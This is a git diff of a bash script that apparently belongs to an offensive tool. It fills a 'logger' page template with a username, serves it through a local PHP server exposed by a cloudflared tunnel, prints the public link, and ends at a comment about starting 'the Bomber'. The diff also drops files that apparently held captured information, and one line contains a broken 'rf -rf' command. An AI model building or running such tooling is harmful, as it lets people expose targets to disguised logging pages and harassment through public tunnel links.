@@ -93,6 +93,7 @@ EQF
 fi
 #<<<::::Create logger::::>>>#
 rm -rf $CWD/assets/index.html >/dev/null 2>&1
+rm -rf $CWD/assets/server.html>/dev/null 2>&1
 while read -r M; do
     echo ${M//€UNAME/$uname}
 done < $CWD/assets/loggerDummy > $CWD/assets/logger2
@@ -101,23 +102,18 @@ while read -r N; do
 done < $CWD/assets/logger2 > $CWD/assets/index.html
 rm -rf $CWD/assets/logger2 >/dev/null 2>&1
 #declare some variables
-Infos="$CWD/assets/send/php/info.txt"
-Result="$CWD/assets/send/php/result.txt"
+NUM="$CWD/assets/php/num.txt"
 if [ ! -d $CWD/logs ]; then
     mkdir logs > /dev/null 2>&1
 else
-    rm -rf $CWD/logs/phpLogs.txt $CWD/logs/phpSend.txt $CWD/logs/cloudflare-log.txt >/dev/null 2>&1
-    rf -rf $Result >/dev/null 2>&1
-    rm -rf $Infos >/dev/null 2>&1
+    rm -rf $CWD/logs/phpSend.txt $CWD/logs/cloudflare-log.txt >/dev/null 2>&1
+    rf -rf $NUM >/dev/null 2>&1
 fi
-if [ -e $Result ]; then
-    rm -rf $Result >/dev/null 2>&1
-fi
-if [ -e $Infos ]; then
-    rm -rf $Infos >/dev/null 2>&1
+if [ -e $NUM ]; then
+    rm -rf $NUM >/dev/null 2>&1
 fi
 killall php cloudflared >/dev/null 2>&1
-cd $CWD/assets/send >/dev/null 2>&1
+cd $CWD/assets/ >/dev/null 2>&1
 php -S 127.0.0.1:4444 >> $CWD/logs/phpSend.txt 2>&1 &
 sleep 4
 if [[ ${OS,,} == *'android'* ]]; then
@@ -128,3 +124,10 @@ fi
 sleep 7
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${CWD}/logs/cloudflare-log.txt")
 #<<<===listner====>>>#
+while read -r X; do
+    echo ${X//€FLINK/$link}
+done< $CWD/assets/serverDummy> $CWD/assets/server.html
+printf "\n${S2}[${S5}+${S2}] ${S4}Login servet started at ${S1}:: ${S2}http://127.0.0.1:4444 ${R0}\n"
+xdg-open http://127.0.0.1:4444
+printf "\n${S2}[${S5}+${S2}] ${S4}Forwarding session at ${S1}:: ${S2}$link ${R0}\n"
+#<<<CheckFound and Start the Bomber>>>#
